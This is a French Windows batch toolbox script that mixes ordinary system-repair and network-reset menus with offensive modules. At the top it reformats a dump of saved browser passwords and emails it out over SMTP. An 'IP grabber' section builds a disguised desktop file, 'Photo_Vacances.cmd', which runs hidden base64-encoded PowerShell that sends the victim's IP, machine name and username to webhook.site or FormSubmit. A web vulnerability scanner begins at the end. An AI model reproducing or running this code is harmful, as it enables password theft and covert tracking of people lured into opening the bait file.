powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='!OUTPUT_FILE!'; if(Test-Path $f){ $lines=Get-Content $f -Encoding UTF8 -ErrorAction SilentlyContinue; $out=@(); $url=''; $user=''; $pass=''; foreach($l in $lines){ if($l -match '^={10,}'){ if($url -or $user -or $pass){ $out+='================================================'; if($url){$out+='URL      : '+$url}; if($user){$out+='Username : '+$user}; if($pass){$out+='Password : '+$pass}; $out+='================================================'; $out+='' }; $url=''; $user=''; $pass='' } elseif($l -match '^URL\s+:\s*(.*)'){ $url=$matches[1].Trim() } elseif($l -match '^User Name\s+:\s*(.*)'){ $user=$matches[1].Trim() } elseif($l -match '^Password\s+:\s*(.*)'){ $pass=$matches[1].Trim() } }; if($url -or $user -or $pass){ $out+='================================================'; if($url){$out+='URL      : '+$url}; if($user){$out+='Username : '+$user}; if($pass){$out+='Password : '+$pass}; $out+='================================================' }; $out | Set-Content $f -Encoding UTF8 }"

if "!NIR_MODE!"=="AUTO_MAIL" (
    echo Envoi de l'export par mail (!SMTP_USER!)...
    powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $p=ConvertTo-SecureString '%SMTP_PASS%' -AsPlainText -Force; $c=New-Object System.Management.Automation.PSCredential('%SMTP_USER%',$p); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $c -From '%SMTP_USER%' -To '%EMAIL_TO%' -Subject 'Export Nirsoft - !custom_filename!' -Body 'Ci-joint l export de mots de passe.' -Attachments '!OUTPUT_FILE!'" >nul 2>&1
    if %errorlevel% equ 0 (
        echo [OK] Mail envoye.
        del /F /Q "!OUTPUT_FILE!" >nul 2>&1
    ) else (
        echo [!] Echec de l'envoi mail. Fichier conserve localement.
    )
) else (
    echo [OK] Export termine : !OUTPUT_FILE!
)

pause

:nirsoft_cleanup
if exist "%WBPV%" del /F /Q "%WBPV%" >nul 2>&1
if exist "%SCRIPT_DIR%\WebBrowserPassView.cfg" del /F /Q "%SCRIPT_DIR%\WebBrowserPassView.cfg" >nul 2>&1
endlocal
goto system_tools

:sys_rescue_menu
set "opts=Creer un Point de Restauration~RECOMMANDE : Sauvegarde l'etat du systeme avant toute reparation"
set "opts=%opts%;Scan RAPIDE du systeme~Le classique SFC /scannow pour reparer l'OS"
set "opts=%opts%;Verification image base~Examine rapidement l'integration (DISM /CheckHealth)"
set "opts=%opts%;Reparation profonde~Telecharge les bons fichiers endommages (DISM /RestoreHealth)"
set "opts=%opts%;Nettoyage massif (Temp/Cache)~Detruit la totalite des fichiers inutiles cachant de l'espace"
set "opts=%opts%;Planifier un CHKDSK (C:)~Audite et repare les secteurs defectueux au prochain boot"
set "opts=%opts%;Reset Fix Windows Update~Redemarre brutalement le catalogue WU bloque ou corrompu"

:: Mapping des targets pour gestion des favoris en sous-menu
set "res_t[1]=res_restore_point"
set "res_t[2]=res_sfc"
set "res_t[3]=res_dism_check"
set "res_t[4]=res_dism_restore"
set "res_t[5]=res_temp_clean"
set "res_t[6]=res_chkdsk"
set "res_t[7]=res_wu_reset"
set "res_t[8]=res_explorer_restart"
set "res_t[9]=res_gpu_reset"

:: Marquer les favoris existants dans le sous-menu
set "res_opts="
set /a resi=0
for %%O in ("Creer un Point de Restauration~RECOMMANDE : Sauvegarde l'etat du systeme avant toute reparation" "Scan RAPIDE du systeme~Le classique SFC /scannow pour reparer l'OS" "Verification image base~Examine rapidement l'integration (DISM /CheckHealth)" "Reparation profonde~Telecharge les bons fichiers endommages (DISM /RestoreHealth)" "Nettoyage massif (Temp/Cache)~Detruit la totalite des fichiers inutiles cachant de l'espace" "Planifier un CHKDSK (C:)~Audite et repare les secteurs defectueux au prochain boot" "Reset Fix Windows Update~Redemarre brutalement le catalogue WU bloque ou corrompu" "Redemarrer l'Explorateur Windows~Corrige les freezes visuels sans redemarrer le PC" "Reinitialiser le pilote GPU~Envoie le signal Win+Ctrl+Shift+B pour relancer l'affichage") do (
    set /a resi+=1
    set "is_f=0"
    set "curr_t=!res_t[%resi%]!"
    for /f "usebackq tokens=*" %%F in ("favoris.txt") do (if "%%F"=="!curr_t!" set "is_f=1")
    if "!is_f!"=="1" (set "res_opts=!res_opts!;(F) %%~O") else (set "res_opts=!res_opts!;%%~O")
)
set "res_opts=!res_opts:~1!"

call :DynamicMenu "OUTIL DE REPARATION WINDOWS (Rescue)" "!res_opts!"
set "reschoice=%errorlevel%"

if "%reschoice%"=="0" goto system_tools

if %reschoice% GEQ 200 (
    set /a t_idx=%reschoice%-200
    call :ToggleFav "!res_t[%t_idx%]!"
    goto sys_rescue_menu
)

if "%reschoice%"=="1" goto res_restore_point
if "%reschoice%"=="2" goto res_sfc
if "%reschoice%"=="3" goto res_dism_check
if "%reschoice%"=="4" goto res_dism_restore
if "%reschoice%"=="5" goto res_temp_clean
if "%reschoice%"=="6" goto res_chkdsk
if "%reschoice%"=="7" goto res_wu_reset
if "%reschoice%"=="8" goto res_explorer_restart
if "%reschoice%"=="9" goto res_gpu_reset
goto sys_rescue_menu

:res_sfc
cls
echo [OPERATION] SFC Scannow en cours (Cela peut prendre plusieurs minutes)...
sfc /scannow
pause
goto sys_rescue_menu

:res_dism_check
cls
echo [OPERATION] DISM /CheckHealth puis ScanHealth...
DISM /Online /Cleanup-Image /CheckHealth
DISM /Online /Cleanup-Image /ScanHealth
pause
goto sys_rescue_menu

:res_dism_restore
cls
echo [OPERATION] DISM /RestoreHealth (Restauration systeme)...
DISM /Online /Cleanup-Image /RestoreHealth
pause
goto sys_rescue_menu

:res_temp_clean
cls
echo [OPERATION] Purge absolue des fichiers inutiles...
echo Suppression de %TEMP%...
del /q /f /s "%TEMP%\*" >nul 2>&1
echo Suppression de C:\Windows\Temp...
del /q /f /s "C:\Windows\Temp\*" >nul 2>&1
echo Suppression du cache Windows Update (SoftwareDistribution\Download)...
net stop wuauserv >nul 2>&1
del /q /f /s "C:\Windows\SoftwareDistribution\Download\*" >nul 2>&1
net start wuauserv >nul 2>&1
echo Nettoyage termine ! De l'espace a ete libere.
pause
goto sys_rescue_menu

:res_chkdsk
cls
echo [OPERATION] Planification d'une reparation CHKDSK sur C:
echo Le disque sera scanne au prochain demarrage du PC.
chkdsk C: /F /R /X
pause
goto sys_rescue_menu

:res_wu_reset
cls
echo [OPERATION] Reinitialisation totale de l'infrastructure Windows Update...
net stop bits >nul 2>&1
net stop wuauserv >nul 2>&1
net stop appidsvc >nul 2>&1
net stop cryptsvc >nul 2>&1
del "%ALLUSERSPROFILE%\Application Data\Microsoft\Network\Downloader\qmgr*.dat" >nul 2>&1
net start bits >nul 2>&1
net start wuauserv >nul 2>&1
net start appidsvc >nul 2>&1
net start cryptsvc >nul 2>&1
echo Les services de mises a jour ont ete recrees de force.
pause
goto sys_rescue_menu

:res_explorer_restart
cls
echo.
echo  [EXPLORER] Redemarrage de l'Explorateur Windows...
echo  L'ecran va clignoter brievement, c'est normal.
echo.
taskkill /f /im explorer.exe >nul 2>&1
timeout /t 2 /nobreak >nul
start explorer.exe
echo  [OK] Explorateur Windows redemarre avec succes !
timeout /t 2 /nobreak >nul
goto sys_rescue_menu

:res_gpu_reset
cls
echo.
echo  [GPU] Reinitialisation du pilote graphique en cours...
echo  L'ecran va peut-etre clignoter brievement (c'est normal).
echo.
powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^+%(B)')"
timeout /t 2 /nobreak >nul
echo  [OK] Signal de reinitialisation GPU envoye !
echo  Si l'ecran n'a pas clignote, verifiez que votre GPU supporte
echo  le raccourci Win+Ctrl+Shift+B (pilotes recents requis).
echo.
pause
goto sys_rescue_menu

:sys_network_menu
set "opts=Vider le cache DNS~Supprime et reinitialise le cache du resolveur (ipconfig /flushdns)"
set "opts=%opts%;Afficher le cache DNS~Liste toutes les entrees DNS stockees en memoire locale (ipconfig /displaydns)"
set "opts=%opts%;Vider le cache ARP~Nettoie instantanement la table de correspondance des IP/MAC (arp -d *)"
set "opts=%opts%;Afficher la table ARP~Affiche les appareils de votre reseau recemment contactes (arp -a)"
set "opts=%opts%;Liberer et Renouveler l'IP~Demande une nouvelle adresse IP au serveur DHCP / Box (release / renew)"
set "opts=%opts%;Reset TCP/IP Stack IPv4/IPv6~Repare la pile reseau vitale de Windows (netsh int ip reset)"
set "opts=%opts%;Reset des Sockets Windows~Reinitialise le catalogue Winsock corrompu (netsh winsock reset)"
set "opts=%opts%;Reset Reseau Automatique~Enchaine silencieusement le Flush DNS, Winsock, et TCP/IP"
set "opts=%opts%;Redemarrer les cartes reseau~Vos pilotes Ethernet et Wi-Fi sont mis hors puis sous tension"
set "opts=%opts%;Executer le Script d'Urgence~Sequence immediate de 7 commandes de depannage massif (Fast Reset)"

call :DynamicMenu "MENU DE DEPANNAGE RESEAU" "%opts%"
set "netchoice=%errorlevel%"

if "%netchoice%"=="1" goto net_flush_dns
if "%netchoice%"=="2" goto net_display_dns
if "%netchoice%"=="3" goto net_clear_arp
if "%netchoice%"=="4" goto net_display_arp
if "%netchoice%"=="5" goto net_renew_ip
if "%netchoice%"=="6" goto net_reset_tcpip
if "%netchoice%"=="7" goto net_reset_winsock
if "%netchoice%"=="8" goto net_reset_all
if "%netchoice%"=="9" goto net_restart_adapters
if "%netchoice%"=="10" goto net_fast_reset
if "%netchoice%"=="0" goto system_tools
goto sys_network_menu

:net_flush_dns
cls
echo Vidage du cache DNS...
ipconfig /flushdns
pause
goto sys_network_menu

:net_display_dns
cls
echo Affichage du cache DNS...
ipconfig /displaydns | more
pause
goto sys_network_menu

:net_clear_arp
cls
echo Nettoyage du cache ARP...
arp -d *
echo Cache ARP vide !
pause
goto sys_network_menu

:net_display_arp
cls
echo Affichage de la table ARP...
arp -a
pause
goto sys_network_menu

:net_renew_ip
cls
echo Liberation de l'IP...
ipconfig /release
echo Renouvellement de l'IP...
ipconfig /renew
pause
goto sys_network_menu

:net_reset_tcpip
cls
echo Reset de la pile TCP/IP...
netsh int ip reset >nul
netsh int ipv6 reset >nul
echo Pile TCP/IP reinitialisee. (Un redemarrage peut etre necessaire)
pause
goto sys_network_menu

:net_reset_winsock
cls
echo Reset du catalogue Winsock...
netsh winsock reset >nul
echo Winsock reinitialise. (Un redemarrage est necessaire)
pause
goto sys_network_menu

:net_reset_all
cls
echo ==== LANCEMENT DU RESET COMPLET ====
ipconfig /flushdns >nul
netsh winsock reset >nul
netsh int ip reset >nul
netsh int ipv6 reset >nul
arp -d * >nul 2>&1
echo.
echo Reset complet effectue ! Veuillez redemarrer votre ordinateur.
pause
goto sys_network_menu

:net_restart_adapters
cls
echo Redemarrage des interfaces reseau...
netsh interface set interface "Wi-Fi" admin=disable 2>nul
netsh interface set interface "Wi-Fi" admin=enable 2>nul
netsh interface set interface "Ethernet" admin=disable 2>nul
netsh interface set interface "Ethernet" admin=enable 2>nul
echo Interfaces redemarrees silencieusement.
pause
goto sys_network_menu

:net_fast_reset
cls
echo =========================================
echo       Script Rapide de Reparation
echo =========================================
echo.
echo [*] Liberation de l'adresse IP actuelle (release)...
ipconfig /release >nul
echo [*] Vidage du cache ARP...
arp -d * >nul 2>&1
echo [*] Vidage du cache NetBIOS (R)...
nbtstat -R >nul
echo [*] Renouvellement du bail DHCP (renew)...
ipconfig /renew >nul
echo [*] Vidage du cache DNS...
ipconfig /flushdns >nul
echo [*] Re-enregistrement avec WINS...
nbtstat -RR >nul
echo [*] Re-enregistrement avec DNS...
ipconfig /registerdns >nul
echo.
echo Reinitialisation reseau terminee avec succes !
pause
goto sys_network_menu

REM ===================================================================
REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
REM ===================================================================
:net_cyber_menu
cls
set "opts=TRIAGE - Diagnostic rapide de connexion;ADAPTATEURS - Infos MAC et vitesse;LAN SCAN - Scan turbo (Marques/Ports/BruteForce);FLUX - Analyse des ports et processus locaux;DNS LEAK - Verifier la fuite DNS (VPN);AUDIT Wi-Fi;IP GRABBER - Obtenir l'IP d'une box distante (Ecoute directe);RETOUR"
call :DynamicMenu "CYBERSECURITE RESEAU" "%opts%" "NONUMS"
set "cyber_choice=%errorlevel%"

    if "%cyber_choice%"=="1" goto cyber_triage
    if "%cyber_choice%"=="2" goto cyber_adapter_audit
    if "%cyber_choice%"=="3" goto cyber_lan_scan
    if "%cyber_choice%"=="4" goto cyber_flux_analysis
    if "%cyber_choice%"=="5" goto cyber_dns_leak
    if "%cyber_choice%"=="6" goto cyber_wifi_audit
    if "%cyber_choice%"=="7" goto cyber_ip_grabber
    if "%cyber_choice%"=="8" goto menu_principal
    goto net_cyber_menu

:cyber_ip_grabber
cls
echo.
echo  ================================================
echo   IP GRABBER FURTIF (MULTI-METHODES)
echo  ================================================
echo.
set "opts=Trame en direct (Ecoute dans cette console);Reception par E-Mail (Asynchrone)"
call :DynamicMenu "CHOIX DE L'EXFILTRATION" "%opts%" "NONUMS NOCLS"
set "ig_ch=%errorlevel%"
if "%ig_ch%"=="0" goto net_cyber_menu
if "%ig_ch%"=="2" goto ig_email

:ig_local
cls
echo.
echo  ================================================
echo   IP GRABBER - ECOUTE LOCALE TEMPS REEL
echo  ================================================
echo.
echo  [i] Connexion au relai et generation du piege en cours...

set "PS_GRAB_FILE=%TEMP%\ig_listen.ps1"
if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"

>  "%PS_GRAB_FILE%" echo $Host.UI.RawUI.FlushInputBuffer()
>> "%PS_GRAB_FILE%" echo try {
>> "%PS_GRAB_FILE%" echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
>> "%PS_GRAB_FILE%" echo $tk = Invoke-RestMethod -Method Post 'https://webhook.site/token' -TimeoutSec 10 -EA Stop
>> "%PS_GRAB_FILE%" echo $id = $tk.uuid
>> "%PS_GRAB_FILE%" echo if (-not $id) { throw 'UUID vide' }
>> "%PS_GRAB_FILE%" echo $url = 'https://webhook.site/' + $id
>> "%PS_GRAB_FILE%" echo $api = 'https://webhook.site/token/' + $id + '/requests'
>> "%PS_GRAB_FILE%" echo $desk = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
>> "%PS_GRAB_FILE%" echo     $pl = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { Invoke-RestMethod -Uri ('" + $url + "/' + `$env:COMPUTERNAME + '/' + `$env:USERNAME) -UseBasicParsing -EA Stop } catch {}"
>> "%PS_GRAB_FILE%" echo     $bytes = [Text.Encoding]::Unicode.GetBytes($pl); $b64 = [Convert]::ToBase64String($bytes)
>> "%PS_GRAB_FILE%" echo     $cmd = "@echo off`r`nstart /B powershell -w hidden -nop -ep bypass -EncodedCommand $b64`r`nexit"
>> "%PS_GRAB_FILE%" echo Set-Content -Path $desk -Value $cmd -Encoding ASCII
>> "%PS_GRAB_FILE%" echo Write-Host ''
>> "%PS_GRAB_FILE%" echo Write-Host '  [OK] Piege genere : Photo_Vacances.cmd' -f Green
>> "%PS_GRAB_FILE%" echo Write-Host '  [i] En attente de la cible... (ECHAP pour annuler)' -f DarkYellow
>> "%PS_GRAB_FILE%" echo Write-Host ''
>> "%PS_GRAB_FILE%" echo $sp = @('^|','/','-','\'); $si = 0; $esc = $false; $found = $false
>> "%PS_GRAB_FILE%" echo while (-not $esc -and -not $found) {
>> "%PS_GRAB_FILE%" echo   if ($Host.UI.RawUI.KeyAvailable) {
>> "%PS_GRAB_FILE%" echo     if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
>> "%PS_GRAB_FILE%" echo   }
>> "%PS_GRAB_FILE%" echo   try {
>> "%PS_GRAB_FILE%" echo     $rs = Invoke-RestMethod -Method Get $api -TimeoutSec 5 -EA Stop
>> "%PS_GRAB_FILE%" echo     if (@($rs.data).Count -gt 0) {
>> "%PS_GRAB_FILE%" echo       $found = $true
>> "%PS_GRAB_FILE%" echo       $d = @($rs.data)[0]
>> "%PS_GRAB_FILE%" echo       $ip_val = $d.ip
>> "%PS_GRAB_FILE%" echo       $segs = if ($d.url) { $d.url.TrimStart('/').Split('/') } else { @('?','?') }
>> "%PS_GRAB_FILE%" echo       $pc_val  = if ($segs.Count -ge 2) { $segs[-2] } else { '?' }
>> "%PS_GRAB_FILE%" echo       $usr_val = if ($segs.Count -ge 1) { $segs[-1] } else { '?' }
>> "%PS_GRAB_FILE%" echo       Write-Host ''
>> "%PS_GRAB_FILE%" echo       Write-Host '  =================================================' -f Red
>> "%PS_GRAB_FILE%" echo       Write-Host ('   IP      : ' + $ip_val)  -f Cyan
>> "%PS_GRAB_FILE%" echo       Write-Host ('   Machine : ' + $pc_val)  -f White
>> "%PS_GRAB_FILE%" echo       Write-Host ('   Session : ' + $usr_val) -f White
>> "%PS_GRAB_FILE%" echo       Write-Host '  =================================================' -f Red
>> "%PS_GRAB_FILE%" echo       Set-Content "$env:TEMP\captured_ip.txt" -Value "$ip_val;$pc_val;$usr_val" -Encoding ASCII
>> "%PS_GRAB_FILE%" echo     }
>> "%PS_GRAB_FILE%" echo   } catch {}
>> "%PS_GRAB_FILE%" echo   if (-not $found) {
>> "%PS_GRAB_FILE%" echo     $i = 3
>> "%PS_GRAB_FILE%" echo     while ($i -gt 0) {
>> "%PS_GRAB_FILE%" echo       [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
>> "%PS_GRAB_FILE%" echo       $si++; $i--
>> "%PS_GRAB_FILE%" echo       Start-Sleep -Milliseconds 1000
>> "%PS_GRAB_FILE%" echo       if ($Host.UI.RawUI.KeyAvailable) {
>> "%PS_GRAB_FILE%" echo         if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
>> "%PS_GRAB_FILE%" echo       }
>> "%PS_GRAB_FILE%" echo     }
>> "%PS_GRAB_FILE%" echo   }
>> "%PS_GRAB_FILE%" echo }
>> "%PS_GRAB_FILE%" echo if (Test-Path $desk) { Remove-Item $desk -Force -EA SilentlyContinue }
>> "%PS_GRAB_FILE%" echo if ($found) { Write-Host '  [OK] Transfert termine.' -f Green }
>> "%PS_GRAB_FILE%" echo } catch {
>> "%PS_GRAB_FILE%" echo     Write-Host "  [ERREUR] $($_.Exception.Message)" -f Red
>> "%PS_GRAB_FILE%" echo }

powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_GRAB_FILE%"
if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"

if exist "%TEMP%\captured_ip.txt" (
    set /p capture_data=<"%TEMP%\captured_ip.txt"
    for /f "tokens=1-3 delims=;" %%a in ("!capture_data!") do (
        set "remote_ip=%%a"
        set "remote_pc=%%b"
        set "remote_user=%%c"
    )
    del /f /q "%TEMP%\captured_ip.txt"

    if not exist "ip distant.txt" type nul > "ip distant.txt"
    findstr /C:"IP: !remote_ip!" "ip distant.txt" >nul
    if errorlevel 1 (
        echo [%date% %time%] IP: !remote_ip! -- PC: !remote_pc! -- User: !remote_user! >> "ip distant.txt"
    )

    echo.
    echo  [!] CIBLE DETECTEE : !remote_ip! (!remote_pc!\!remote_user!)
    echo  [i] Informations enregistrees dans 'ip distant.txt'
    echo  [i] Passage immédiat à l'Audit de penetration...
    
    set "remote_port=NONE"
    goto cyber_remote_menu
)

goto net_cyber_menu

:ig_email
cls
echo.
echo  ================================================
echo   IP GRABBER - TRANSFERT PAR E-MAIL
echo  ================================================
echo.
echo  [i] Cette methode ferme la fenetre CMD chez la cible et vous envoie
echo      les informations directement sur votre messagerie via l'API FormSubmit.
echo.
echo  [!] ATTENTION : Lors du TOUT PREMIER essai, vous recevrez un email
echo      de FormSubmit vous demandant de "Confirmer/Activer" l'adresse.
echo      Cliquez sur le lien, puis les fois suivantes seront automatiques.
echo.
call :InputWithEsc "Votre adresse e-mail de reception : " grab_email
if errorlevel 1 goto cyber_ip_grabber
if "!grab_email!"=="" goto cyber_ip_grabber

set "PS_GRAB=%TEMP%\ip_grab.ps1"
if exist "%PS_GRAB%" del /f /q "%PS_GRAB%"

>  "%PS_GRAB%" echo $cmdPath = "$env:USERPROFILE\Desktop\Photo_Vacances.cmd"
set "gemail=!grab_email!"
>> "%PS_GRAB%" echo $u = 'https://formsubmit.co/%gemail%'
>> "%PS_GRAB%" echo $psPayload = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$b=@{IP=`$ip; Machine=`$env:COMPUTERNAME; Session=`$env:USERNAME; _subject='Nouvelle Cible Identifiee'; _captcha='false'}; Invoke-RestMethod -Uri `$u -Method Post -Body `$b -UseBasicParsing } catch {}"
>> "%PS_GRAB%" echo $psPayloadBytes = [System.Text.Encoding]::Unicode.GetBytes($psPayload)
>> "%PS_GRAB%" echo $psB64 = [Convert]::ToBase64String($psPayloadBytes)
>> "%PS_GRAB%" echo $obf = "@echo off`r`nstart /B powershell -w 1 -nop -ep bypass -EncodedCommand $psB64`r`nexit"
>> "%PS_GRAB%" echo Set-Content -Path $cmdPath -Value $obf -Encoding ASCII
>> "%PS_GRAB%" echo Write-Host ''
>> "%PS_GRAB%" echo Write-Host '  [OK] Piege genere sur le Bureau : Photo_Vacances.cmd' -f Green
>> "%PS_GRAB%" echo Write-Host "  [i] Le payload l'expediera vers : !grab_email!" -f DarkGray
>> "%PS_GRAB%" echo Write-Host ''
>> "%PS_GRAB%" echo Write-Host '  (Appuyez sur une touche pour revenir au menu)' -f Gray

powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_GRAB%"
if exist "%PS_GRAB%" del "%PS_GRAB%"
pause >nul
goto net_cyber_menu


:cyber_triage
cls
echo.
echo  ================================================
echo   TRIAGE DE CONNECTIVITE (FLASH)
echo  ================================================
echo.
echo   [>] 1. Analyse de la configuration IP...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '127.0.0.1'} | Select-Object @{N='Interface';E={$_.InterfaceAlias}}, @{N='Adresse_IP';E={$_.IPAddress}} | Format-Table -AutoSize"
echo   [>] 2. Test de la passerelle (Box)...
powershell -NoProfile -Command "$gw=(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -EA SilentlyContinue | Select-Object -ExpandProperty NextHop -First 1); if($gw){Write-Host '      [OK] Passerelle detectee :' $gw -f Green} else {Write-Host '      [ECHEC] Aucune passerelle !' -f Red}"
echo   [>] 3. Verification des serveurs DNS...
powershell -NoProfile -Command "$dns=(Get-DnsClientServerAddress).ServerAddresses | Select-Object -Unique; if($dns){Write-Host '      [OK] DNS actifs :' ($dns -join ', ') -f Green} else {Write-Host '      [ECHEC] Pas de DNS !' -f Red}"
echo.
pause
goto net_cyber_menu

:cyber_adapter_audit
cls
echo.
echo  ================================================
echo   AUDIT DES ADAPTATEURS RESEAU
echo  ================================================
powershell -NoProfile -Command "Write-Host ' NOM             | STATUT       | VITESSE      | ADRESSE MAC' -f White; Write-Host ' ---------------|--------------|--------------|-------------------' -f Gray; Get-NetAdapter -EA SilentlyContinue | Where-Object {$_.Status -ne 'Not Present'} | ForEach-Object { $s = switch($_.Status){'Up'{'Actif'};'Down'{'Inactif'};'Disconnected'{'Deconnecte'};default{$_.Status}}; Write-Host (' ' + $_.Name.PadRight(15) + ' | ' + $s.PadRight(12) + ' | ' + $_.LinkSpeed.ToString().PadRight(12) + ' | ' + $_.MacAddress) -f Gray }"
echo.
pause
goto net_cyber_menu

:cyber_flux_analysis
cls
echo.
echo  ================================================
echo   ANALYSE DES FLUX (PORTS ET PROCESSUS)
echo  ================================================
powershell -NoProfile -Command "$conns = Get-NetTCPConnection -State Established,Listen -EA SilentlyContinue; if($conns){ $conns | Select-Object @{N='Port_Local';E={$_.LocalPort}}, @{N='Adresse_Distante';E={$_.RemoteAddress}}, @{N='Etat';E={$_.State}}, @{N='Processus';E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}} | Sort-Object Etat | Format-Table -AutoSize } else { Write-Host '   Aucune connexion active detectee.' -f Yellow }"
echo.
pause
goto net_cyber_menu

:cyber_security_audit
cls
echo.
echo  ================================================
echo   AUDIT DE SECURITE ET DEFENSE
echo  ================================================
echo   Audite le pare-feu, les partages SMB et
echo   detecte les ports pirates.
echo.
echo  1. Etat du Pare-feu :
powershell -NoProfile -Command "$f = Get-NetFirewallProfile; foreach($p in $f){ $c = if($p.Enabled -eq 'True'){'Green'}else{'Red'}; $st = if($p.Enabled -eq 'True'){'ACTIF'}else{'INACTIF'}; Write-Host ('   [' + $p.Name + '] : ' + $st) -f $c }"
echo.
echo  2. Detection de Ports Suspects (RAT/Backdoors) :
powershell -NoProfile -Command "$sp=@{1337='DarkComet';4444='Metasploit';31337='BackOrifice';3389='RDP (Acces Distant)'}; $open=Get-NetTCPConnection -State Listen -EA SilentlyContinue | Select-Object -ExpandProperty LocalPort; $found=$false; foreach($p in $sp.Keys){ if($open -contains $p){ Write-Host ('   [ALERTE] Port ' + $p + ' ouvert - ' + $sp[$p]) -f Red; $found=$true } }; if(-not $found){ Write-Host '   [OK] Aucun port pirate suspect.' -f Green }"
echo.
echo  3. Partages Reseau Ouverts (SMB) :
powershell -NoProfile -Command "$s = Get-SmbShare | Where-Object {$_.Name -notmatch '\$'}; if($s){ $s | Select-Object @{N='Nom';E={$_.Name}}, @{N='Chemin';E={$_.Path}}, @{N='Description';E={$_.Description}} | Format-Table -AutoSize } else { Write-Host '   [OK] Aucun dossier partage visible sur le reseau.' -f Green }"
echo.
echo  [i] ANALYSE DES RISQUES (Defense) :
echo  1. Firewall : S'il est desactive, n'importe qui peut scanner vos ports.
echo  2. Backdoors : Les ports 4444 ou 1337 indiquent souvent une infection active.
echo  3. Partages : SMB est le vecteur prefere des ransomwares (WannaCry).
echo  CONSEIL : Activez toujours votre pare-feu et desactivez SMBv1.
echo.
pause
goto net_cyber_menu

:cyber_web_pentest
cls
echo.
echo  ================================================
echo   SCANNER DE VULNERABILITES WEB (PENTEST)
echo  ================================================
echo   Scan automatise des failles courantes : 
echo   Headers, SSL, SQLi, XSS, SSTI et plus.
echo.
echo  [i] Ce module teste : Headers, SSL, SQLi, XSS, SSTI,
echo      CORS, Rate Limit, Clickjacking, Prototype Pollution.
echo.
echo  Entrez l'URL a tester (ex: https://example.com ou https://site.com?id=1)
set "ALEEX_PENTEST_URL="
set /p "ALEEX_PENTEST_URL=URL : "
if not defined ALEEX_PENTEST_URL goto net_cyber_menu

echo.
echo  [i] Demarrage du scan pour !ALEEX_PENTEST_URL!...
echo  (Appuyez sur ECHAP pour annuler)
echo.

set "WPS=%TEMP%\wpentest_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"

echo $url = $env:ALEEX_PENTEST_URL >> "%WPS%"
echo if ([string]::IsNullOrWhiteSpace($url)) { Write-Host "  [!] URL vide." -f Red; exit } >> "%WPS%"
echo if ($url -notmatch '^^http') { $url = 'https://' + $url } >> "%WPS%"
echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" >> "%WPS%"
echo $findings = @() >> "%WPS%"
echo $score = 100 >> "%WPS%"
echo. >> "%WPS%"
echo function Print-Result($sev, $msg) { >> "%WPS%"
echo     $script:findings += [PSCustomObject]@{Sev=$sev;Msg=$msg} >> "%WPS%"
echo     $c = switch($sev){ 'CRITICAL' {'Magenta'}; 'HIGH' {'Red'}; 'MEDIUM' {'Yellow'}; 'LOW' {'Cyan'}; default {'Green'} } >> "%WPS%"
echo     $label = switch($sev){ 'CRITICAL' {'CRITIQUE'}; 'HIGH' {'ELEVE'}; 'MEDIUM' {'MOYEN'}; 'LOW' {'FAIBLE'}; default {'INFO'} } >> "%WPS%"
echo     Write-Host "  [$label] " -NoNewline -f $c; Write-Host $msg >> "%WPS%"
echo     $pts = switch($sev){ 'CRITICAL' {25}; 'HIGH' {15}; 'MEDIUM' {8}; 'LOW' {3}; default {0} } >> "%WPS%"
echo     $script:score -= $pts >> "%WPS%"
echo } >> "%WPS%"
echo. >> "%WPS%"
echo function Show-Phase($num, $total, $label) { >> "%WPS%"
echo     $bar = '#' * $num + '.' * ($total - $num) >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host "  [$bar] Phase $num/$total - $label" -f Cyan >> "%WPS%"
echo } >> "%WPS%"
echo. >> "%WPS%"
echo Write-Host "  Cible : $url" -f DarkGray >> "%WPS%"
echo Write-Host "" >> "%WPS%"
echo. >> "%WPS%"
echo try { >> "%WPS%"
echo. >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo # PHASE 1/7 - HEADERS ET COOKIES >> "%WPS%"
echo # ============================================================ >> "%WPS%"
echo Show-Phase 1 7 "Headers et Cookies" >> "%WPS%"
echo try { >> "%WPS%"
echo     $resp = Invoke-WebRequest $url -UserAgent $ua -Method Get -TimeoutSec 15 -EA Stop -UseBasicParsing >> "%WPS%"
echo     $h = $resp.Headers >> "%WPS%"
echo     $headersToCheck = @{ >> "%WPS%"
echo         'Content-Security-Policy'      = 'MEDIUM' >> "%WPS%"
echo         'X-Frame-Options'              = 'MEDIUM' >> "%WPS%"
echo         'X-Content-Type-Options'       = 'LOW' >> "%WPS%"
echo         'Strict-Transport-Security'    = 'MEDIUM' >> "%WPS%"
echo         'Permissions-Policy'           = 'LOW' >> "%WPS%"
echo         'Cross-Origin-Opener-Policy'   = 'LOW' >> "%WPS%"
echo         'Cross-Origin-Resource-Policy' = 'LOW' >> "%WPS%"
echo         'X-XSS-Protection'             = 'LOW' >> "%WPS%"
echo         'Referrer-Policy'              = 'LOW' >> "%WPS%"
echo     } >> "%WPS%"
